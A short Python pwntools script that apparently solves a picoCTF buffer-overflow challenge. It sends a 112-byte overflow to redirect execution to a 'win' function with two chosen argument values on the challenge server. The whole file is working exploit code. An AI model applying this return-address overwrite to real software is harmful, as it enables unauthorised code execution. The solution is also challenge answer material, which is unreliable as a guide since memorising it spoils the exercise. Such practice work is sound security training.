#!/usr/bin/env python3
from pwn import *

# Set the context
context.update(arch='i386', os='linux')

# Define the target binary and remote server
binary_path = 'vuln'
host = 'saturn.picoctf.net'
port = 64802

# Define the offset for buffer overflow exploits
offset = 112

# Function to get the address of a specific function
def get_function_address(binary, function_name):
    elf = ELF(binary)
    address = elf.symbols[function_name]
    return hex(address)

# Function to interact with the binary (local or remote)
def start(flag):
	if flag:
		return remote(host, port)
	else:
		return process(binary_path)

def exploit():
    p = start(True)
    retAddr = get_function_address(binary_path,'win')
    p.sendline(b'A' * offset + p32(int(retAddr,16)) + b'A' * 4 + p32(0xCAFEF00D) + p32(0xF00DF00D))
    p.interactive()

# Run the exploit
if __name__ == '__main__':
    exploit()
